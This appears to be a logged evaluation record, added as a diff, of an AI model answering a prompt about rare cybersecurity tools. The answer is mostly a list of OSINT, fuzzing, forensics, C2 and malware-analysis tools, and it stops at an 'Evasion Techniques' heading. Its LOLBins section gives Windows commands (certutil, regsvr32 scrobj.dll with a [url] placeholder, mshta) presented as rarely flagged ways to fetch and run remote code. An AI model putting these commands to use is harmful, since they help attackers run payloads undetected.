@@ -1,0 +1,124 @@
+Wave:      2026-05-29
+Dataset:   persona_prompts
+Item ID:   infinity_chat_07_baseline
+Model:     anthropic/claude-4.6-sonnet-20260217 (openrouter)
+Condition: baseline
+SES level: nan  role: nan
+Tokens:    in=15 out=1023
+Latency:   22254 ms
+Error:     none
+
+── Prompt ──────────────────────────────────────────────────────────
+Rare tools or methods in cyber security
+
+── Response ────────────────────────────────────────────────────────
+# Rare & Underutilized Tools/Methods in Cybersecurity
+
+## 🔍 Reconnaissance & OSINT
+
+| Tool/Method | Description |
+|-------------|-------------|
+| **Maltego CE** | Advanced relationship mapping beyond basic OSINT |
+| **SpiderFoot HX** | Automated OSINT with 200+ data sources |
+| **FOCA** | Metadata extraction from public documents |
+| **Datasploit** | Automated OSINT framework rarely used in practice |
+| **Creepy** | Geolocation OSINT from social media |
+
+---
+
+## 🛠️ Exploitation & Testing
+
+### Rarely Used but Powerful
+- **Boofuzz** — Network protocol fuzzing (successor to Sulley)
+- **Peach Fuzzer** — Advanced fuzzing framework for custom protocols
+- **PRET** — Printer exploitation toolkit (often overlooked attack surface)
+- **RouterSploit** — Embedded device exploitation framework
+- **Killchain** — Automated attack chain simulation
+
+### Hardware Hacking
+- **ChipWhisperer** — Side-channel attack analysis
+- **JTAGulator** — JTAG/UART interface discovery
+- **Bus Pirate** — Hardware protocol analysis
+- **Facedancer** — USB attack emulation
+
+---
+
+## 🧠 Advanced Analysis Methods
+
+### Memory Forensics
+```
+Volatility3 plugins rarely used:
+- windows.callbacks    → Kernel callback analysis
+- windows.driverirp   → Driver IRP hooking detection
+- linux.hidden_modules → Rootkit detection
+- windows.hollowfind  → Process hollowing detection
+```
+
+### Binary Analysis
+- **Angr** — Symbolic execution engine
+- **Triton** — Dynamic binary analysis framework
+- **Manticore** — Symbolic execution for smart contracts & binaries
+- **Ghidra Scripting** — Most users ignore the scripting API
+
+---
+
+## 🌐 Network & Traffic Analysis
+
+| Tool | Rare Use Case |
+|------|---------------|
+| **Zeek (Bro)** | Behavioral network analysis vs. signature-based |
+| **Arkime (Moloch)** | Full packet capture at scale |
+| **NetworkMiner** | Passive network forensics |
+| **Scapy** | Custom packet crafting/analysis |
+| **Nzyme** | WiFi defense & monitoring |
+
+---
+
+## 🔐 Cryptography & Steganography
+
+- **Stegsolve** — Image steganography analysis
+- **zsteg** — PNG/BMP hidden data detection
+- **SteghideX** — Advanced steganography detection
+- **HashID** — Rare hash identification
+- **RsaCtfTool** — RSA vulnerability exploitation
+- **Padding Oracle attacks** — Often missed in web assessments
+
+---
+
+## 🏗️ Infrastructure & Red Team
+
+### C2 Frameworks (Beyond Metasploit)
+```
+Rarely deployed:
+├── Havoc C2        → Modern, evasion-focused
+├── Brute Ratel C4  → EDR evasion specialist
+├── Sliver          → Open-source, cross-platform
+├── Covenant        → .NET-based C2
+└── Nighthawk       → Commercial, highly evasive
+```
+
+### Living Off the Land (LOLBins)
+```powershell
+# Rarely flagged execution methods
+certutil.exe -urlcache -split -f [url]
+mshta.exe javascript:...
+wmic process call create "cmd.exe"
+regsvr32 /s /n /u /i:[url] scrobj.dll
+```
+
+---
+
+## 🧬 Malware Analysis
+
+| Tool | Purpose |
+|------|---------|
+| **CAPE Sandbox** | Malware config extraction |
+| **Cutter** | Radare2 GUI for reverse engineering |
+| **x64dbg scripts** | Automated unpacking |
+| **FLOSS** | Obfuscated string extraction |
+| **Capa** | Malware capability detection |
+| **Detect-It-Easy** | Packer/compiler identification |
+
+---
+
+## 🕵️ Evasion Techniques (Defensive Awareness)
